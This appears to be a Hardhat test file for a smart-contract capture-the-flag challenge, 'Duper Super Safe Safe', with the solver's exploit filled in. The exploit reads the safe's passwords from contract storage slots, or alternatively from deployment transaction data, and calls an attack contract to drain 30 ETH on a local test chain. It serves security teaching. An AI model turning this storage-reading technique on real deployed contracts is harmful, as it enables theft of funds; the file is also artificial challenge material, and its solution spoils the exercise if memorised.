const {ethers} = require('hardhat');
const {expect} = require('chai');

function make_pass(length) {
  var result = '';
  var characters =
      'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  var charactersLength = characters.length;
  for (var i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}

describe('[Challenge] Duper Super Safe Safe', function() {
  let deployer, attacker;

  const INITIAL_SAFE_BALANCE = ethers.utils.parseEther('30');
  const ATTACKER_ETH = ethers.utils.parseEther('100');

  before(async function() {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker] = await ethers.getSigners();

    await ethers.provider.send("hardhat_setBalance", [
      attacker.address, "0x56bc75e2d63100000" // 100 eth
    ]);

    expect(await ethers.provider.getBalance(attacker.address))
        .to.equal(ATTACKER_ETH);
    const pass1 = ethers.utils.formatBytes32String(make_pass(31));
    const pass2 = ethers.utils.formatBytes32String(make_pass(31));

    this.safe = await (await ethers.getContractFactory(
                           'DuperSuperSafeSafe',
                           deployer,
                           ))
                    .deploy(pass1, pass2, {value : INITIAL_SAFE_BALANCE});

    expect(await ethers.provider.getBalance(this.safe.address))
        .to.equal(INITIAL_SAFE_BALANCE);

    expect(await this.safe.isSolved()).to.be.false;
  });

  it('Exploit', async function() {
    /** CODE YOUR EXPLOIT HERE */

    function hex2a(hexx) {
      var hex = hexx.toString();
      var str = '';
      for (var i = 0; i < hex.length; i += 2)
          str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
      return str;
  }


    this.exploit = await (await ethers.getContractFactory(
      'HackDuperSuperSafeSafe',
      attacker,
      ))
    .deploy(this.safe.address);


    /* leak pass from transaction
    a=await ethers.provider.getBlockWithTransactions(1);
    a=a.transactions[0].data.slice(-128)
    const pass1=ethers.utils.formatBytes32String(hex2a(a.slice(-128,-66)))
    const pass2=ethers.utils.formatBytes32String(hex2a(a.slice(-64,-2)))
    */

    const pos1= ethers.utils.keccak256(ethers.utils.hexlify("0x"+"0".repeat(64+63)+"1"));
    const pos2= ethers.utils.keccak256(ethers.utils.hexlify("0x"+"0".repeat(63) +"1"+   "0".repeat(63)+"1"));

    const pass1 = await ethers.provider.getStorageAt(this.safe.address,pos1);
    const pass2 = await ethers.provider.getStorageAt(this.safe.address,pos2);

    const timestamp=await ethers.provider.getStorageAt(this.safe.address,2);

    this.exploit.connect(attacker).hack(INITIAL_SAFE_BALANCE, pass1, pass2, timestamp,{value:ethers.utils.parseEther('99')});
  });

  after(async function() {
    /** SUCCESS CONDITIONS */

    expect(await this.safe.isSolved()).to.be.true;
  });
});
